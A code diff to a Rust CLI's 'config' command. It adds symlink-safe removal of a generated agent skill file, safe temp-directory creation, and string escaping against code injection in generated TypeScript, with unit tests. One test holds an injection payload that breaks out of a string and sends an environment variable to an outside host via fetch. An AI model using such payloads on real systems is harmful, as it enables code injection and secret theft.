@@ -7,10 +7,14 @@ use std::{
 };
 
 use is_terminal::IsTerminal;
+use sha2::{Digest, Sha256};
 
 use crate::util::prompt::{prompt_confirm_with_default, prompt_select};
 
 use super::*;
+
+const LEGACY_CONFIG_SKILL_SHA256: &str =
+    "08dff6674cd2df2d8a37fd2c0f3ef8aa506b353e88005331910387514430e00e";
 
 /// Define, import, preview, and apply your Railway project from .railway/railway.ts
 #[derive(Parser)]
@@ -131,6 +135,21 @@ struct PullArgs {
 }
 
 pub async fn command(args: Args) -> Result<()> {
+    if let Ok(cwd) = std::env::current_dir() {
+        match remove_generated_legacy_skill(&cwd, LEGACY_CONFIG_SKILL_SHA256) {
+            Ok(true) => eprintln!(
+                "{} {}",
+                "Removed".dimmed(),
+                ".agents/skills/railway-config".cyan()
+            ),
+            Ok(false) => {}
+            Err(error) => eprintln!(
+                "{} Failed to remove the generated railway-config skill: {error}",
+                "Warning:".yellow()
+            ),
+        }
+    }
+
     match args.command {
         Command::Plan(args) => {
             if args.yes {
@@ -155,6 +174,79 @@ pub async fn command(args: Args) -> Result<()> {
     }
 }
 
+/// True when every component under `root` is a real directory rather than a
+/// symlink. The path components here come from the checked-out repository, and
+/// this runs before the requested command, so a link anywhere in the chain
+/// would redirect the cleanup at a directory outside the project.
+fn path_is_symlink_free(root: &Path, components: &[&str]) -> Result<bool> {
+    let mut current = root.to_path_buf();
+    for component in components {
+        current.push(component);
+        match fs::symlink_metadata(&current) {
+            Ok(metadata) if metadata.file_type().is_symlink() => return Ok(false),
+            Ok(_) => {}
+            Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(false),
+            Err(error) => {
+                return Err(error)
+                    .with_context(|| format!("Failed to inspect {}", current.display()));
+            }
+        }
+    }
+    Ok(true)
+}
+
+fn remove_generated_legacy_skill(cwd: &Path, expected_hash: &str) -> Result<bool> {
+    // This is an unprompted recursive delete that runs on every `railway
+    // config` invocation, before dispatch and before auth, against a path built
+    // from repository content. Refuse it unless the whole chain is ordinary
+    // directories inside the project.
+    if !path_is_symlink_free(cwd, &[".agents", "skills", "railway-config"])? {
+        return Ok(false);
+    }
+
+    let skill_dir = cwd.join(".agents").join("skills").join("railway-config");
+    let skill_file = skill_dir.join("SKILL.md");
+
+    match fs::symlink_metadata(&skill_file) {
+        Ok(metadata) if !metadata.file_type().is_file() => return Ok(false),
+        Ok(_) => {}
+        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(false),
+        Err(error) => {
+            return Err(error)
+                .with_context(|| format!("Failed to inspect {}", skill_file.display()));
+        }
+    }
+
+    // Belt and braces: the resolved directory must still sit under the resolved
+    // project root, in case a component was swapped between the checks above.
+    let canonical_root =
+        fs::canonicalize(cwd).with_context(|| format!("Failed to resolve {}", cwd.display()))?;
+    let canonical_dir = fs::canonicalize(&skill_dir)
+        .with_context(|| format!("Failed to resolve {}", skill_dir.display()))?;
+    if !canonical_dir.starts_with(&canonical_root) {
+        return Ok(false);
+    }
+
+    let contents = match fs::read(&skill_file) {
+        Ok(contents) => contents,
+        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(false),
+        Err(error) => {
+            return Err(error).with_context(|| format!("Failed to read {}", skill_file.display()));
+        }
+    };
+
+    if format!("{:x}", Sha256::digest(&contents)) != expected_hash {
+        return Ok(false);
+    }
+
+    // Remove only the file we recognised, then the directory if that emptied
+    // it. Anything the user added alongside the generated skill survives.
+    fs::remove_file(&skill_file)
+        .with_context(|| format!("Failed to remove {}", skill_file.display()))?;
+    let _ = fs::remove_dir(&skill_dir);
+    Ok(true)
+}
+
 async fn init_config(args: InitArgs) -> Result<()> {
     let cwd = std::env::current_dir().context("Unable to get current directory")?;
     let project_name = cwd
@@ -166,11 +258,8 @@ async fn init_config(args: InitArgs) -> Result<()> {
     let railway_dir = cwd.join(".railway");
     let railway_file = railway_dir.join("railway.ts");
     let readme_file = railway_dir.join("README.md");
-    let skill_dir = cwd.join(".agents").join("skills").join("railway-config");
-    let skill_file = skill_dir.join("SKILL.md");
 
     create_parent(&railway_file)?;
-    create_parent(&skill_file)?;
 
     let init_mode = if railway_file.exists() || !std::io::stdout().is_terminal() {
         InitMode::GenerateFromRepo
@@ -208,12 +297,8 @@ async fn init_config(args: InitArgs) -> Result<()> {
     }
     write_new(
         &readme_file,
-        include_str!("../../../assets/railway-config/README.md"),
+        include_str!("../../../assets/iac/README.md"),
         args.force,
-    )?;
-    let wrote_skill = write_asset_if_missing(
-        &skill_file,
-        include_str!("../../../assets/railway-config/SKILL.md"),
     )?;
 
     println!("{}", "Railway configuration initialized".green().bold());
@@ -231,13 +316,6 @@ async fn init_config(args: InitArgs) -> Result<()> {
         "Created".dimmed(),
         readme_file.display().to_string().cyan()
     );
-    if wrote_skill {
-        println!(
-            "{} {}",
-            "Created".dimmed(),
-            skill_file.display().to_string().cyan()
-        );
-    }
     println!();
     println!("{}", "Next steps".bold());
     println!(
@@ -294,11 +372,6 @@ async fn pull_config(args: PullArgs) -> Result<()> {
     let cwd = std::env::current_dir().context("Unable to get current directory")?;
     let railway_file = cwd.join(".railway").join("railway.ts");
     let readme_file = cwd.join(".railway").join("README.md");
-    let skill_file = cwd
-        .join(".agents")
-        .join("skills")
-        .join("railway-config")
-        .join("SKILL.md");
 
     if args.json {
         let graph = load_current_graph(args.runner).await?;
@@ -307,7 +380,6 @@ async fn pull_config(args: PullArgs) -> Result<()> {
     }
 
     create_parent(&railway_file)?;
-    create_parent(&skill_file)?;
     write_pulled_config(
         &railway_file,
         args.force,
@@ -315,14 +387,8 @@ async fn pull_config(args: PullArgs) -> Result<()> {
         !args.omit_preserved_variables,
     )
     .await?;
-    let wrote_readme = write_asset_if_missing(
-        &readme_file,
-        include_str!("../../../assets/railway-config/README.md"),
-    )?;
-    let wrote_skill = write_asset_if_missing(
-        &skill_file,
-        include_str!("../../../assets/railway-config/SKILL.md"),
-    )?;
+    let wrote_readme =
+        write_asset_if_missing(&readme_file, include_str!("../../../assets/iac/README.md"))?;
 
     println!("{}", "Railway configuration imported".green().bold());
     println!(
@@ -335,13 +401,6 @@ async fn pull_config(args: PullArgs) -> Result<()> {
             "{} {}",
             "Created".dimmed(),
             readme_file.display().to_string().cyan()
-        );
-    }
-    if wrote_skill {
-        println!(
-            "{} {}",
-            "Created".dimmed(),
-            skill_file.display().to_string().cyan()
         );
     }
     println!();
@@ -381,13 +440,27 @@ async fn write_pulled_config(
 }
 
 async fn load_current_graph(runner: Option<String>) -> Result<runner::DesiredGraph> {
-    let temp_dir = std::env::current_dir()
-        .context("Unable to get current directory")?
-        .join(format!(".railway-config-pull-{}", std::process::id()));
-    fs::create_dir_all(&temp_dir).context("Failed to create temporary Railway config directory")?;
-    let temp_file = temp_dir.join("railway.ts");
-    fs::write(&temp_file, railway_ts("import-placeholder"))
-        .context("Failed to write temporary Railway config")?;
+    // A PID-derived name in the working directory is predictable, and
+    // `create_dir_all` + `fs::write` will happily adopt a directory someone else
+    // precreated and follow a `railway.ts` they left as a symlink. On a shared
+    // workspace that turns this placeholder write into a clobber of any file the
+    // victim can write. Let the OS pick a random owner-only directory instead,
+    // and refuse to write through anything that already exists.
+    let temp_dir = tempfile::Builder::new()
+        .prefix(".railway-config-pull-")
+        .tempdir_in(std::env::current_dir().context("Unable to get current directory")?)
+        .context("Failed to create temporary Railway config directory")?;
+    let temp_file = temp_dir.path().join("railway.ts");
+    {
+        use std::io::Write;
+        let mut file = fs::OpenOptions::new()
+            .write(true)
+            .create_new(true)
+            .open(&temp_file)
+            .context("Failed to create temporary Railway config")?;
+        file.write_all(railway_ts("import-placeholder").as_bytes())
+            .context("Failed to write temporary Railway config")?;
+    }
 
     let args = runner::Args {
         file: Some(temp_file.clone()),
@@ -404,8 +477,8 @@ async fn load_current_graph(runner: Option<String>) -> Result<runner::DesiredGra
         show_values: false,
     };
     let response = runner::run(&args, "current").await?;
-    let _ = fs::remove_file(temp_file);
-    let _ = fs::remove_dir(temp_dir);
+    // `temp_dir` cleans itself up on drop, including on the error paths below.
+    drop(temp_dir);
 
     if !response.ok {
         let diagnostics = response
@@ -566,8 +639,8 @@ fn render_graph_as_railway_ts(graph: &runner::DesiredGraph, preserve_variables: 
                 };
                 if helper == "service" {
                     out.push_str(&format!(
-                        "  const {var_name} = service(\"{}\");\n",
-                        resource.name
+                        "  const {var_name} = service({});\n",
+                        ts_string(&resource.name)
                     ));
                 } else {
                     let region = database_region(resource.deploy.as_ref());
@@ -580,8 +653,8 @@ fn render_graph_as_railway_ts(graph: &runner::DesiredGraph, preserve_variables: 
             }
             "service" => {
                 out.push_str(&format!(
-                    "  const {var_name} = service(\"{}\"",
-                    resource.name
+                    "  const {var_name} = service({}",
+                    ts_string(&resource.name)
                 ));
                 let body = render_service_body(
                     resource,
@@ -599,13 +672,13 @@ fn render_graph_as_railway_ts(graph: &runner::DesiredGraph, preserve_variables: 
                 let config = resource.config.as_ref().map(ts_value).unwrap_or_default();
                 if config.is_empty() {
                     out.push_str(&format!(
-                        "  const {var_name} = bucket(\"{}\");\n",
-                        resource.name
+                        "  const {var_name} = bucket({});\n",
+                        ts_string(&resource.name)
                     ));
                 } else {
                     out.push_str(&format!(
-                        "  const {var_name} = bucket(\"{}\", {config});\n",
-                        resource.name
+                        "  const {var_name} = bucket({}, {config});\n",
+                        ts_string(&resource.name)
                     ));
                 }
             }
@@ -613,13 +686,13 @@ fn render_graph_as_railway_ts(graph: &runner::DesiredGraph, preserve_variables: 
                 let config = resource.config.as_ref().map(ts_value).unwrap_or_default();
                 if config.is_empty() {
                     out.push_str(&format!(
-                        "  const {var_name} = volume(\"{}\");\n",
-                        resource.name
+                        "  const {var_name} = volume({});\n",
+                        ts_string(&resource.name)
                     ));
                 } else {
                     out.push_str(&format!(
-                        "  const {var_name} = volume(\"{}\", {config});\n",
-                        resource.name
+                        "  const {var_name} = volume({}, {config});\n",
+                        ts_string(&resource.name)
                     ));
                 }
             }
@@ -649,13 +722,13 @@ fn render_graph_as_railway_ts(graph: &runner::DesiredGraph, preserve_variables: 
             .collect::<Vec<_>>();
         if children.is_empty() {
             out.push_str(&format!(
-                "  const {var_name} = group(\"{}\");\n",
-                resource.name
+                "  const {var_name} = group({});\n",
+                ts_string(&resource.name)
             ));
         } else {
             out.push_str(&format!(
-                "  const {var_name} = group(\"{}\", [{}]);\n",
-                resource.name,
+                "  const {var_name} = group({}, [{}]);\n",
+                ts_string(&resource.name),
                 children.join(", ")
             ));
         }
@@ -1139,6 +1212,58 @@ fn is_empty_object(value: &serde_json::Value) -> bool {
     value.as_object().is_some_and(|object| object.is_empty())
 }
 
+/// Render an untrusted string as a TypeScript string literal.
+///
+/// Resource names come from shared project state that any collaborator can
+/// write, and this output is imported and evaluated by the runner on the next
+/// `config plan`. Interpolating a name between literal quotes lets a name
+/// containing `");` close the call and append statements. JSON string syntax is
+/// a subset of TypeScript's, so serialising the name is a context-correct
+/// encode rather than a filter.
+fn ts_string(value: &str) -> String {
+    serde_json::to_string(value).unwrap_or_else(|_| format!("{value:?}"))
+}
+
+#[cfg(test)]
+mod resource_name_encoding_tests {
+    use super::ts_string;
+
+    #[test]
+    fn a_name_cannot_escape_the_string_literal() {
+        // The payload from the report: close the call, append a statement,
+        // comment out the remainder.
+        let rendered = ts_string("x\");fetch(\"http://a/\"+process.env.X);//");
+        assert_eq!(
+            rendered,
+            "\"x\\\");fetch(\\\"http://a/\\\"+process.env.X);//\""
+        );
+        // One opening and one closing quote: nothing broke out.
+        assert!(rendered.starts_with('"') && rendered.ends_with('"'));
+        assert_eq!(rendered.matches("\\\"").count(), 3);
+    }
+
+    #[test]
+    fn escapes_backslashes_newlines_and_controls() {
+        assert_eq!(ts_string("a\\b"), "\"a\\\\b\"");
+        assert_eq!(ts_string("a\nb"), "\"a\\nb\"");
+        assert_eq!(ts_string("a\u{7}b"), "\"a\\u0007b\"");
+    }
+
+    #[test]
+    fn template_and_comment_syntax_stays_inert() {
+        // Double-quoted literals do not interpolate, so ${} is data. The point
+        // is that the quotes around it survive.
+        assert_eq!(ts_string("${process.env.HOME}"), "\"${process.env.HOME}\"");
+        assert_eq!(ts_string("*/ evil() /*"), "\"*/ evil() /*\"");
+    }
+
+    #[test]
+    fn ordinary_names_are_unchanged_apart_from_quoting() {
+        assert_eq!(ts_string("postgres"), "\"postgres\"");
+        assert_eq!(ts_string("my-service_2"), "\"my-service_2\"");
+    }
+}
+
 fn ts_value(value: &serde_json::Value) -> String {
     match value {
         serde_json::Value::Object(object) => {
@@ -1422,6 +1547,78 @@ mod tests {
     use super::*;
     use serde_json::json;
 
+    #[test]
+    fn removes_generated_legacy_skill_when_contents_match() {
+        let cwd = tempfile::tempdir().unwrap();
+        let skill_dir = cwd.path().join(".agents/skills/railway-config");
+        fs::create_dir_all(&skill_dir).unwrap();
+        fs::write(skill_dir.join("SKILL.md"), "generated skill").unwrap();
+        let hash = format!("{:x}", Sha256::digest(b"generated skill"));
+
+        assert!(remove_generated_legacy_skill(cwd.path(), &hash).unwrap());
+        assert!(!skill_dir.exists());
+    }
+
+    #[test]
+    fn preserves_modified_legacy_skill() {
+        let cwd = tempfile::tempdir().unwrap();
+        let skill_dir = cwd.path().join(".agents/skills/railway-config");
+        fs::create_dir_all(&skill_dir).unwrap();
+        fs::write(skill_dir.join("SKILL.md"), "user changes").unwrap();
+
+        assert!(!remove_generated_legacy_skill(cwd.path(), "different").unwrap());
+        assert!(skill_dir.exists());
+    }
+
+    #[test]
+    fn preserves_user_files_alongside_the_generated_skill() {
+        let cwd = tempfile::tempdir().unwrap();
+        let skill_dir = cwd.path().join(".agents/skills/railway-config");
+        fs::create_dir_all(&skill_dir).unwrap();
+        fs::write(skill_dir.join("SKILL.md"), "generated skill").unwrap();
+        fs::write(skill_dir.join("NOTES.md"), "mine").unwrap();
+        let hash = format!("{:x}", Sha256::digest(b"generated skill"));
+
+        assert!(remove_generated_legacy_skill(cwd.path(), &hash).unwrap());
+        assert!(!skill_dir.join("SKILL.md").exists());
+        assert!(skill_dir.join("NOTES.md").exists());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn refuses_to_delete_through_a_symlinked_ancestor() {
+        let root = tempfile::tempdir().unwrap();
+        let cwd = root.path().join("repo");
+        let outside = root.path().join("external");
+        let target = outside.join("skills/railway-config");
+        fs::create_dir_all(&cwd).unwrap();
+        fs::create_dir_all(&target).unwrap();
+        fs::write(target.join("SKILL.md"), "generated skill").unwrap();
+        fs::write(target.join("DO_NOT_DELETE.txt"), "mine").unwrap();
+        std::os::unix::fs::symlink(&outside, cwd.join(".agents")).unwrap();
+        let hash = format!("{:x}", Sha256::digest(b"generated skill"));
+
+        assert!(!remove_generated_legacy_skill(&cwd, &hash).unwrap());
+        assert!(target.join("SKILL.md").exists());
+        assert!(target.join("DO_NOT_DELETE.txt").exists());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn refuses_when_the_skill_file_itself_is_a_symlink() {
+        let root = tempfile::tempdir().unwrap();
+        let cwd = root.path().join("repo");
+        let skill_dir = cwd.join(".agents/skills/railway-config");
+        fs::create_dir_all(&skill_dir).unwrap();
+        let outside = root.path().join("victim.md");
+        fs::write(&outside, "generated skill").unwrap();
+        std::os::unix::fs::symlink(&outside, skill_dir.join("SKILL.md")).unwrap();
+        let hash = format!("{:x}", Sha256::digest(b"generated skill"));
+
+        assert!(!remove_generated_legacy_skill(&cwd, &hash).unwrap());
+        assert!(outside.exists());
+    }
+
     fn service_resource(
         source: serde_json::Value,
         deploy: serde_json::Value,
@@ -1470,6 +1667,56 @@ mod tests {
         assert!(rendered.contains("source: github"));
         assert!(rendered.contains("start: \"pnpm start\""));
         assert!(!rendered.contains("registryCredentials"));
+    }
+
+    #[test]
+    fn pull_renderer_preserves_image_resource_limits() {
+        let resource = service_resource(
+            json!({ "image": "nginx:latest" }),
+            json!({
+                "limitOverride": {
+                    "containers": { "cpu": 2, "memoryBytes": 2_000_000_000_i64 }
+                }
+            }),
+        );
+
+        let rendered = render_service_body(
+            &resource,
+            &std::collections::BTreeMap::new(),
+            &std::collections::HashMap::new(),
+            true,
+        );
+
+        assert!(rendered.contains("source: image(\"nginx:latest\")"));
+        assert!(rendered.contains("cpu: 2"));
+        assert!(rendered.contains("memoryBytes: 2000000000"));
+    }
+
+    #[test]
+    fn pull_renderer_preserves_quoted_bucket_references_when_values_are_visible() {
+        let mut resource = service_resource(json!({ "image": "nginx:latest" }), json!({}));
+        resource.variables = Some(
+            json!({
+                "InspectionsBucket__BucketName": {
+                    "type": "literal",
+                    "value": "${{inspections_media.BUCKET}}"
+                }
+            })
+            .as_object()
+            .unwrap()
+            .clone(),
+        );
+
+        let rendered = render_service_body(
+            &resource,
+            &std::collections::BTreeMap::new(),
+            &std::collections::HashMap::new(),
+            false,
+        );
+
+        assert!(
+            rendered.contains("InspectionsBucket__BucketName: \"${{inspections_media.BUCKET}}\"")
+        );
     }
 
     #[test]
